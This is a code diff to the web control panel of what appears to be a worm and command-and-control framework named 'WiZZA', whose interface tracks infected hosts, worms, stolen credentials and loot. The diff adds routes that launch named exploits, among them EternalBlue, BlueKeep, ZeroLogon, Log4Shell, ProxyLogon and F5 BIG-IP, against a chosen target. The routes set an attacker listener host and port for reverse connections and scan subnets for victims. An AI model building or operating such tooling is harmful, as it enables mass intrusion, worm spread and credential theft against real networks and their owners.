@@ -51,6 +51,20 @@ try:
 except ImportError:
     _LLMNR_OK = False
 
+_EXPLOIT_DIR = os.path.join(_THIS_DIR, "..", "exploit")
+if _EXPLOIT_DIR not in _sys.path: _sys.path.insert(0, _EXPLOIT_DIR)
+try:
+    import network_cve as _net_cve
+    _NET_CVE_OK = True
+except ImportError:
+    _NET_CVE_OK = False
+
+try:
+    import web_cve as _web_cve
+    _WEB_CVE_OK = True
+except ImportError:
+    _WEB_CVE_OK = False
+
 # ── Per-request polymorphic mutation cache ────────────────────────────────────
 _POLY_CACHE: dict = {}          # fname -> (mtime, mutated_bytes)
 _POLY_LOCK  = threading.Lock()
@@ -589,6 +603,7 @@ a{{color:var(--acc);text-decoration:none}}
 <a class="nav" onclick="T('wctl')" id="n-wctl">&#x2699; Worm Control</a>
 <a class="nav" href="/netmap" target="_blank">&#x1F5FA; Net Map</a>
 <a class="nav" href="/report" target="_blank">&#x1F4CB; Report</a>
+<a class="nav" href="/exploit" target="_blank">&#x1F4A5; Exploits</a>
 <div id="sbar"><div>Online: <b>{ac}</b></div><div>Worms: <b>{wc}</b></div><div>Creds: <b>{cc}</b></div><div>Loot: <b>{lc}</b></div></div>
 </div>
 <div id="main">
@@ -1205,6 +1220,72 @@ class H(BaseHTTPRequestHandler):
             else:
                 self._json({"Status": 0})
             return
+
+        # ── Network CVE exploits ──────────────────────────────────────────────
+        if path.startswith("/exploit/net/"):
+            if not _NET_CVE_OK:
+                self._send("network_cve module not available"); return
+            cve = path[len("/exploit/net/"):]
+            target = qs.get("target", [""])[0]
+            lhost  = qs.get("lhost", [""])[0]
+            lport  = int(qs.get("lport", ["4444"])[0])
+            extra  = {k: v[0] for k, v in qs.items() if k not in ("target","lhost","lport")}
+            if cve == "scan":
+                subnet = qs.get("subnet", [target])[0]
+                summary, _ = _net_cve.scan_for_targets(subnet)
+                self._send("\n".join(summary) or "No targets found", "text/plain"); return
+            if not target:
+                self._send("?target= required"); return
+            result = _net_cve.run(cve, target_ip=target, lhost=lhost, lport=lport, **extra)
+            log(f"[NET-CVE] {cve} -> {target}: {str(result)[:80]}")
+            self._send(str(result), "text/plain"); return
+
+        # ── Web CVE exploits ──────────────────────────────────────────────────
+        if path.startswith("/exploit/web/"):
+            if not _WEB_CVE_OK:
+                self._send("web_cve module not available"); return
+            cve = path[len("/exploit/web/"):]
+            target = qs.get("target", [""])[0]
+            lhost  = qs.get("lhost", [""])[0]
+            lport  = int(qs.get("lport", ["4444"])[0])
+            cmd    = qs.get("cmd", [None])[0]
+            extra  = {k: v[0] for k, v in qs.items() if k not in ("target","lhost","lport","cmd")}
+            if not target:
+                self._send("?target= required"); return
+            kwargs = {"lhost": lhost, "lport": lport}
+            if cmd: kwargs["cmd"] = cmd
+            # Map target param: web CVEs use target_url or target_email or target_ip
+            if cve in ("outlookntlm", "cve202323397"):
+                kwargs = {"target_email": target, "attacker_smb_ip": lhost}
+            elif cve in ("bigip", "f5", "cve20221388"):
+                kwargs = {"target_url": target, "cmd": cmd or "id"}
+            else:
+                kwargs["target_url"] = target
+            kwargs.update(extra)
+            result = _web_cve.run(cve, **kwargs)
+            log(f"[WEB-CVE] {cve} -> {target}: {str(result)[:80]}")
+            self._send(str(result), "text/plain"); return
+
+        # ── Exploit module index ──────────────────────────────────────────────
+        if path == "/exploit":
+            lines = ["=== WiZZA CVE Exploit Modules ===\n",
+                     "Network CVEs:", "  EternalBlue  /exploit/net/eternalblue?target=IP&lhost=IP",
+                     "  BlueKeep     /exploit/net/bluekeep?target=IP&lhost=IP",
+                     "  SMBGhost     /exploit/net/smbghost?target=IP&lhost=IP",
+                     "  PrintNightmare /exploit/net/printnightmare?target=IP&lhost=IP",
+                     "  ZeroLogon    /exploit/net/zerologon?target=DC_IP&dc_name=DC&domain=DOMAIN",
+                     "  Follina      /exploit/net/follina?lhost=IP",
+                     "  Scan subnet  /exploit/net/scan?subnet=192.168.1.0",
+                     "",
+                     "Web CVEs:", "  Log4Shell    /exploit/web/log4shell?target=URL&lhost=IP",
+                     "  Spring4Shell /exploit/web/spring4shell?target=URL&lhost=IP",
+                     "  ProxyLogon   /exploit/web/proxylogon?target=URL&lhost=IP",
+                     "  Confluence   /exploit/web/confluence?target=URL&lhost=IP",
+                     "  vCenter      /exploit/web/vcenter?target=URL&lhost=IP",
+                     "  Outlook NTLM /exploit/web/outlookntlm?target=EMAIL&lhost=ATTACKER_IP",
+                     "  F5 BIG-IP    /exploit/web/bigip?target=URL&cmd=id",
+                     ]
+            self._send("\n".join(lines), "text/plain"); return
 
         # Agent delete
         if path=="/agent/delete":
